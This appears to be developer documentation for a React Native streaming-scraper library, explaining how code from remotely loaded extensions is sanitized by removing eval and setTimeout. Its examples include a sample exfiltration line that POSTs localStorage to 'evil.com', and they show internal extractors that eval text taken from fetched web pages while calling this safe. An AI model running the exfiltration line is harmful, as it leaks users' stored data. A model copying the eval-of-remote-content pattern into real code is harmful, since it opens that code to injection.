# Security in Extension Loading

## Summary: Your Extractors Are Safe! ✅

The `evaluateProviderCode` sanitization **only affects external extension code**, not your internal extractors. Here's why:

### ✅ **What Gets Sanitized** (External Extensions)
```typescript
// Malicious extension code from untrusted URL:
const maliciousCode = `
  eval('alert("I hacked your app!")'); // ❌ This gets removed
  setTimeout(() => location.href = 'http://evil.com', 1000); // ❌ This gets removed
  
  export const createProvider = (context) => {
    return {
      search: async (query) => {
        // ✅ This still works - extractor usage is unaffected!
        const result = await context.extractors.MixDrop.extract(videoUrl);
        return result;
      }
    };
  };
`;
```

### ✅ **What Stays Untouched** (Your Internal Code)
Your extractors that use `eval` for deobfuscation remain completely unaffected:

```typescript
// src/extractors/mixdrop.ts - WORKS PERFECTLY
export class MixDrop {
  async extract(url: URL): Promise<ISource> {
    const { data } = await this.axios.get(url.href);
    // ✅ This eval works fine - it's in YOUR extractor, not external code
    const formated = eval(/(eval)(\(f.*?)(\n<\/script>)/s.exec(data)![2]!.replace('eval', ''));
    // ... rest of extraction logic
  }
}
```

## How the Security Works

### 1. **Two-Layer Architecture**
```
┌─────────────────────────────────────────────────────┐
│ External Extensions (Sanitized)                     │
│ ┌─────────────────────────────────────────────────┐ │
│ │ eval() removed, setTimeout() removed            │ │
│ │ But can still use:                              │ │
│ │ - context.axios                                 │ │
│ │ - context.extractors.MixDrop (with eval)        │ │
│ │ - context.extractors.FileMoon (with eval)       │ │
│ └─────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────┐
│ Your Internal Extractors (Untouched)                │
│ ┌─────────────────────────────────────────────────┐ │
│ │ eval() works perfectly for deobfuscation        │ │
│ │ setTimeout() works for retries                  │ │
│ │ All original functionality preserved            │ │
│ └─────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────┘
```

### 2. **Context Injection**
```typescript
import { createProviderFromURL, createProviderContext } from 'react-native-consumet';

// Context provides REAL extractors with eval capabilities
const context = createProviderContext();

// External provider gets sanitized but can use real extractors
const externalProvider = await createProviderFromURL(
  'https://untrusted-source.com/provider.js',
  'createProvider',
  { sanitize: true } // Default: removes eval from extension code
);

// When external provider calls extractors, they work normally:
const videoSources = await externalProvider.getEpisodeSources(episodeId);
// ↑ This internally calls context.extractors.MixDrop.extract()
// ↑ Which uses eval() for deobfuscation - works perfectly!
```

## Configuration Options

### 1. **Default (Secure)**
```typescript
// Extensions are sanitized, extractors work normally
const provider = await createProviderFromURL(url, 'createProvider');
```

### 2. **Trusted Source (No Sanitization)**
```typescript
// For trusted sources that might need eval legitimately
const provider = await createProviderFromURL(
  'https://my-trusted-server.com/provider.js',
  'createProvider',
  { sanitize: false } // Disables sanitization
);
```

### 3. **Custom Security Level**
```typescript
import { evaluateProviderCode } from 'react-native-consumet';

// Manual control over what gets sanitized
const module = evaluateProviderCode(
  extensionCode,
  ['console', 'Promise', 'URL', 'fetch'], // Allowed globals
  { sanitize: false } // Trust this code
);
```

## Real-World Examples

### Example 1: Untrusted Extension
```typescript
// Extension from random GitHub repo:
const untrustedCode = `
  // This would be malicious:
  eval('fetch("https://evil.com/steal", { method: "POST", body: localStorage })');
  
  export const createAnimeProvider = (context) => {
    return {
      search: async (query) => {
        const response = await context.axios.get(\`/search?q=\${query}\`);
        const $ = context.load(response.data);
        
        // This works fine - using your extractors:
        const videoUrl = $('.video-link').attr('href');
        const sources = await context.extractors.MixDrop.extract(new URL(videoUrl));
        
        return { sources };
      }
    };
  };
`;

// After sanitization:
const sanitizedCode = `
  // This gets commented out:
  // eval('fetch("https://evil.com/steal", { method: "POST", body: localStorage })');
  
  export const createAnimeProvider = (context) => {
    return {
      search: async (query) => {
        const response = await context.axios.get(\`/search?q=\${query}\`);
        const $ = context.load(response.data);
        
        // This still works perfectly:
        const videoUrl = $('.video-link').attr('href');
        const sources = await context.extractors.MixDrop.extract(new URL(videoUrl));
        
        return { sources };
      }
    };
  };
`;
```

### Example 2: Your Extractors Keep Working
```typescript
// This happens inside MixDrop extractor when called by ANY provider:
export class MixDrop extends VideoExtractor {
  async extract(url: URL): Promise<ISource> {
    const { data } = await this.axios.get(url.href);
    
    // ✅ This eval works perfectly - it's YOUR code, not external:
    const deobfuscated = eval(
      /(eval)(\(f.*?)(\n<\/script>)/s
        .exec(data)![2]!
        .replace('eval', '')
    );
    
    // Parse the deobfuscated code
    const videoUrl = deobfuscated.match(/https.*?\.mp4/)?.[0];
    
    return {
      sources: [{ url: videoUrl, quality: 'auto', isM3U8: false }],
      quality: 'auto'
    };
  }
}
```

## Security Benefits

### 🛡️ **Protection Against**
- Malicious eval() in extensions
- Code injection attacks
- Data theft through dynamic code
- Timer-based attacks (setTimeout/setInterval)

### ✅ **While Preserving**
- Full extractor functionality
- Legitimate eval() usage in YOUR code
- Performance optimizations
- Existing API compatibility

## Best Practices

### 1. **Use Sanitization by Default**
```typescript
// Safe for untrusted sources
const provider = await loadProviderFromURL(githubUrl, 'createProvider');
```

### 2. **Disable for Trusted Sources**
```typescript
// Your own extensions
const provider = await loadProviderFromURL(
  'https://your-server.com/provider.js',
  'createProvider',
  { sanitize: false }
);
```

### 3. **Test Extensions Before Use**
```typescript
import { testProviderURL } from 'react-native-consumet';

const test = await testProviderURL(extensionUrl);
if (test.isValid && test.loadTime < 5000) {
  const provider = await createProviderFromURL(extensionUrl, 'createProvider');
} else {
  console.error('Extension failed validation:', test.errors);
}
```

## The Bottom Line

Your extractors that use `eval` for deobfuscation will work **exactly as before**. The sanitization only affects external extension code, providing security without breaking functionality.

This gives you:
- 🔒 **Security** against malicious extensions
- ⚡ **Performance** - extractors work at full speed  
- 🛠️ **Flexibility** - can disable sanitization for trusted sources
- 🔄 **Compatibility** - zero changes needed to existing code
